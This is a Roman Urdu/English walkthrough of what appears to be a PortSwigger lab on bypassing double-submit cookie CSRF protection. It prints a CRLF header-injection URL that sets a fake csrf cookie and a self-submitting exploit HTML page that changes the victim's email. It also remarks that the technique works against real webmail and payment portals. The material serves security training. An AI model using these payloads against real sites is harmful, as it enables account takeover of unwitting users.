🔥 Lab Ka Root Masla:

Website ne CSRF se bachne ke liye double-submit cookie method use kiya hai, jo insecure hota hai agar cookie client-side se hi set ki ja sakti ho. Is case mein hum search endpoint ka misuse karenge, jahan se hum Set-Cookie header inject kar sakte hain victim ke browser mein.


---

🧠 Lab Ka Solution:

✅ Step 1: Login and Capture Email Change Request

Burp browser open karo aur wiener:peter se login karo.

Go to "My Account" → Change your email (e.g., test1@evil.com).

Burp Proxy → History mein jao, us request ko dhoondo jahan email update hui hai.

Right-click → Send to Repeater.


✅ Step 2: Observe CSRF Token Behavior

Repeater mein dekho:

Body mein csrf=fake jaisa kuch ho ga.

Cookies mein bhi csrf=fake type ka hoga.


Yani server simply yeh check karta hai: Request Body ka csrf == Cookie ka csrf ➤ No session tie, insecure!


---

✅ Step 3: Discover Cookie Injection via Search

Website par kuch search karo (e.g. test).

Proxy → History mein search request dhoondo.

Dekho response headers mein: Set-Cookie: csrf=... dikha?

Matlab, hum search endpoint se cookie inject kar sakte hain!



---

✅ Step 4: Build Malicious URL for Cookie Injection

Yeh specially crafted URL banaye:


https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None

📌 %0d%0a means new line → isse Set-Cookie header inject hota hai.


---

✅ Step 5: Create Exploit HTML Page

Burp ka exploit server open karo → New exploit request → Raw mein paste karo:

<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attackeremail@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
  </body>
</html>

📌 csrf=fake → dono jagah same rakhna (cookie aur form).


---

✅ Step 6: Store & Deliver

Exploit server par HTML save karo.

Make sure email koi naya unique ho (jo pehle kisi ne use na kiya ho).

"Store" par click karo.

Phir "Deliver to victim" pe click karo.



---

🟢 Lab Solve Ho Jayega!


---

💡 Penetration Testing Tip:

Double-submit CSRF protection sirf tab secure hoti hai jab:

Cookies HttpOnly hoon

Session ke saath tightly linked ho


Yahan humne browser se fake csrf cookie inject ki and form submit kar diya — real-world mein yeh technique webmail, payment portals mein CSRF attacks mein kaam aati hai.


---